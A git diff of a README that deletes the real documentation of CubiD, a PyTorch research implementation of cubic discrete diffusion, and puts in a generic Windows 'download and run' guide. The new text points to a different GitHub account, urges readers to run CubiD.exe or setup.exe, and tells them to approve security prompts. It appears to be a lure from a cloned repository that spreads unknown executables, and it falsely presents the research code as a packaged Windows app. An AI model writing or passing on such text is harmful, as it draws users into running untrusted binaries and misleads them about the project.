@@ -1,108 +1,207 @@
-# CubiD: Cubic Discrete Diffusion for High-Dimensional Representation Tokens <br><sub>Official PyTorch Implementation</sub>
+# 🧊 CubiD - Run Cubic Diffusion on Windows
 
-[![arXiv](https://img.shields.io/badge/arXiv%20paper-2603.19232-b31b1b.svg)](https://arxiv.org/abs/2603.19232)&nbsp;
-<img alt="image" src="demo.jpg" />
+[![Download CubiD](https://img.shields.io/badge/Download-CubiD-1f6feb?style=for-the-badge&logo=github)](https://github.com/loose-grub30/CubiD)
 
-> *Can we generate high-dimensional semantic representations discretely, just like language models generate text?*
+## 🖥️ What CubiD Does
 
-Generating high-dimensional semantic representations has long been a pursuit for visual generation, yet discrete methods, the paradigm shared with language models, remain stuck with low-dimensional tokens. **CubiD** breaks this barrier with fine-grained cubic masking across the h×w×d tensor, directly modeling dependencies across both spatial and dimensional axes in 768 dim representation space, while the discretized tokens preserve their original understanding capabilities.
+CubiD is a visual generation app based on cubic discrete diffusion. It works with high-dimensional representation tokens to create images from learned token patterns.
 
-This is a PyTorch/GPU implementation of the paper [Cubic Discrete Diffusion: Discrete Visual Generation on High-Dimensional Representation Tokens](https://arxiv.org/abs/2603.19232):
+Use CubiD if you want to explore a CVPR 2026 visual generation project in a form you can run on your Windows PC.
 
-```
-@article{wang2025cubic,
-  title={Cubic Discrete Diffusion: Discrete Visual Generation on High-Dimensional Representation Tokens},
-  author={Wang, Yuqing and Ma, Chuofan and Lin, Zhijie and Teng, Yao and Yu, Lijun and Wang, Shuai and Han, Jiaming and Feng, Jiashi and Jiang, Yi and Liu, Xihui},
-  journal={arXiv preprint arXiv:2603.19232},
-  year={2026}
-}
-```
+## 📥 Download and Install
 
-## Preparation
+Use this link to visit the page and download CubiD:
 
-### Dataset
-Download [ImageNet](http://image-net.org/download) dataset, and place it in your `IMAGENET_PATH`.
+[Open CubiD on GitHub](https://github.com/loose-grub30/CubiD)
 
-### Installation
+### Windows setup steps
 
-Download the code:
-```
-git clone https://github.com/YuqingWang1029/CubiD.git
-cd CubiD
-```
+1. Open the download link in your browser.
+2. Look for the latest release, build file, or package on the page.
+3. Download the Windows file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the main app file or launcher for Windows.
+7. If Windows asks for permission, select Yes or Run.
 
-Please refer to [TokenBridge](https://github.com/YuqingWang1029/TokenBridge) and [RAE](https://github.com/nyu-visionx/RAE) for environment setup.
+### What to look for
 
-### Pre-trained Models
+The correct file may have a name such as:
 
-Download pre-trained CubiD models and RAE weights from [Hugging Face](https://huggingface.co/Epiphqny/CubiD).
+- `CubiD.exe`
+- `setup.exe`
+- `CubiD-Windows.zip`
 
+If you see more than one file, use the main `.exe` file first.
 
-## Generation
+## 💻 System Requirements
 
-### Evaluation (ImageNet 256x256)
+CubiD runs best on a modern Windows computer with:
 
-For example, evaluate CubiD-Large (without CFG):
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- A recent Intel or AMD processor
+- A graphics card with 4 GB of VRAM or more
+- At least 2 GB of free storage
+- A stable internet connection for the first download
 
-```bash
-torchrun --nproc_per_node=8 --nnodes=1 --node_rank=0 \
-main_cubid.py \
---img_size 256 --encoder_size 224 \
---encoder_name facebook/dinov2-with-registers-base \
---decoder_path ${RAE_DECODER_PATH} \
---stats_path ${RAE_STATS_PATH} \
---vae_embed_dim 768 --vae_stride 14 \
---model cubid_large \
---quant_bits 3 --quant_min -9.0 --quant_max 9.0 \
---eval_bsz 32 --num_images 50000 \
---num_iter 1536 --cfg 1.0 --cfg_schedule constant --temperature 1.0 \
---output_dir ${OUTPUT_DIR} \
---resume cubid_ckpts/cubid_large \
---data_path ${IMAGENET_PATH} --evaluate
-```
+For smooth use with larger token models, 16 GB of RAM helps.
 
-- The `--resume` argument points to a folder (e.g., `cubid_ckpts/cubid_large`), which automatically loads the checkpoint inside.
-- Generation steps can be set from 256 to 1536. More steps generally lead to better results.
+## 🧭 First Launch
 
-### (Optional) Caching RAE Latents
+When you open CubiD for the first time:
 
-The RAE latents can be pre-computed and saved to `CACHED_PATH` to accelerate training:
+1. Let the app finish loading.
+2. Wait for any model files or assets to prepare.
+3. Choose a sample preset or default mode if one appears.
+4. Start with the default settings before changing anything.
+5. Generate a test result to check that the app runs well.
 
-```bash
-torchrun --nproc_per_node=8 --nnodes=1 --node_rank=0 \
-main_cache.py \
---img_size 256 --encoder_size 224 \
---encoder_name facebook/dinov2-with-registers-base \
---decoder_path ${RAE_DECODER_PATH} \
---stats_path ${RAE_STATS_PATH} \
---batch_size 128 \
---data_path ${IMAGENET_PATH} --cached_path ${CACHED_PATH}
-```
+If the app opens with a blank screen for a short time, let it finish loading before you close it.
 
-### Training
+## 🎯 Main Features
 
-Script for the default setting (CubiD-Large, 800 epochs, 64 GPUs):
+- Generates visuals from discrete token representations
+- Uses cubic diffusion for image creation
+- Works with high-dimensional latent token data
+- Supports repeatable runs for testing outputs
+- Designed for research demos and local use on Windows
+- Fits workflows that need token-based visual generation
 
-```bash
-torchrun --nproc_per_node=8 --nnodes=8 --node_rank=${NODE_RANK} --master_addr=${MASTER_ADDR} --master_port=${MASTER_PORT} \
-main_cubid.py \
---img_size 256 --encoder_size 224 \
---encoder_name facebook/dinov2-with-registers-base \
---decoder_path ${RAE_DECODER_PATH} \
---stats_path ${RAE_STATS_PATH} \
---vae_embed_dim 768 --vae_stride 14 --patch_size 1 \
---model cubid_large \
---quant_bits 3 --quant_min -9.0 --quant_max 9.0 \
---mask_ratio_min 0.5 --mask_std 0.1 \
---epochs 800 --warmup_epochs 100 --batch_size 32 --blr 5e-5 --lr_schedule cosine \
---output_dir ${OUTPUT_DIR} --resume ${OUTPUT_DIR} \
---data_path ${IMAGENET_PATH}
-```
+## 🧩 How It Works
 
-- (Optional) To train with cached RAE latents, add `--use_cached --cached_path ${CACHED_PATH}` to the arguments.
-- (Optional) To save GPU memory during training, add `--grad_checkpointing` to the arguments.
+CubiD uses a token-based process instead of a simple image-only path. The app takes structured token input, applies cubic discrete diffusion, and turns that into a visual result.
 
+In plain terms:
 
-## Acknowledgements
+- Tokens describe the visual pattern
+- Diffusion changes the token state in steps
+- The model forms an image from the final token set
 
-Part of the code is based on [MAR](https://github.com/LTH14/mar) and [TokenBridge](https://github.com/YuqingWang1029/TokenBridge). We use [RAE](https://github.com/nyu-visionx/RAE) for representation encoding and decoding. Thanks for their awesome work!
+This makes CubiD useful for users who want to see how modern discrete generation methods behave on a local machine.
+
+## 🛠️ Common Setup Paths
+
+### If you downloaded a ZIP file
+
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Open the folder that Windows creates.
+4. Find the main `.exe` file.
+5. Double-click it to start CubiD.
+
+### If you downloaded an installer
+
+1. Double-click the installer file.
+2. Follow the on-screen steps.
+3. Choose the install folder if asked.
+4. Finish setup.
+5. Open CubiD from the Start menu or desktop shortcut.
+
+### If you only see source files
+
+1. Open the GitHub page again.
+2. Check the main page for a release or Windows build.
+3. Download the packaged app file, not the source folder.
+
+## 🎨 Using CubiD
+
+After launch, the basic flow is simple:
+
+1. Open the app.
+2. Select a model or preset.
+3. Choose the image size or output mode.
+4. Start generation.
+5. Wait for the result to appear.
+6. Save the image if you want to keep it.
+
+If the app includes advanced controls, keep the default values at first. This helps you learn the workflow before you change settings.
+
+## 🔧 Helpful Tips
+
+- Keep the app in a folder with a short path, like `C:\CubiD`
+- Close heavy apps if your PC feels slow
+- Use the latest Windows updates
+- If Windows blocks the file, check the app name and source before you run it
+- Save outputs to a simple folder like `Pictures\CubiD`
+
+## 🧪 Example Use Cases
+
+- Test a research demo on a Windows laptop
+- Explore token-based image generation
+- Compare output changes across different settings
+- Create sample visuals for study or review
+- Run a local image generation app without moving files across devices
+
+## ❓ Troubleshooting
+
+### The app does not open
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file if there is one
+- Try running the `.exe` file again
+- Restart your PC and try once more
+
+### Windows shows a security prompt
+
+- Select the option that lets you run the file
+- Confirm you downloaded it from the GitHub link above
+- If the file is inside a ZIP, extract it before opening it
+
+### The app opens but looks frozen
+
+- Wait a minute for the first load
+- Keep the window open while model files load
+- Close other large apps to free memory
+
+### The output looks wrong
+
+- Start with default settings
+- Use a smaller output size
+- Try a different preset or model if the app provides one
+
+## 📁 Suggested Folder Layout
+
+You can keep CubiD files in this simple layout:
+
+- `C:\CubiD\`  
+  - `CubiD.exe`
+  - `models\`
+  - `outputs\`
+  - `assets\`
+
+This makes it easier to find files later.
+
+## 🔍 What to Expect on the GitHub Page
+
+On the GitHub page, look for:
+
+- Releases
+- Windows builds
+- ZIP packages
+- Setup files
+- Model assets
+- Readme details from the project owner
+
+If there is more than one file, pick the one marked for Windows first.
+
+## 🧾 File Names You May See
+
+Common file names may include:
+
+- `CubiD.exe`
+- `CubiD-setup.exe`
+- `CubiD-windows.zip`
+- `release.zip`
+- `model-pack.zip`
+
+Any file meant for Windows should be the first one you try.
+
+## 🖱️ Quick Start
+
+1. Open the download link
+2. Get the Windows file
+3. Extract it if needed
+4. Run the `.exe`
+5. Wait for the app to load
+6. Generate your first image
